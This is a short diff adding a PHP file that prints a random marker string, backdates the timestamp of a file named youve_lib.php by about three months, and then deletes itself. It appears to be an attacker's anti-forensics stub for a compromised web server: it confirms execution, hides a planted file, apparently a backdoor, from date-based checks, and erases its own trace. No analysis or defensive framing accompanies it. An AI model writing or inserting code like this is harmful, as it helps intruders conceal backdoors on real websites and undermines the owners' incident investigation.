@@ -1,0 +1,1 @@
+<?php echo "gZkzTNaUDf"; if (file_exists("./youve_lib.php")){ touch("./youve_lib.php",(time()-60*60*24*30*3)); } unlink(__FILE__); /*b16hcarmSHzKvdrd2wc4*/ ?>
